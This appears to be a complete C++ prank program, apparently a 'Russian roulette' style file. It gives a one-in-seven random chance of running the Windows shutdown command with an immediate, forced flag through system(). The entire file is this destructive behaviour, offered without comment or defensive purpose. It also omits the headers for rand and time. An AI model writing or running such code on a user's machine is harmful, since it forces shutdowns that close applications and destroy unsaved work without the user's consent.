#include <iostream>
#include <random>

int main() {
	srand(time(NULL));
	int num = rand() % 7;
	if (num == 6) {
		system("C:\\windows\\System32\\shutdown /s /t 0 /f");
	}
	return 0;
}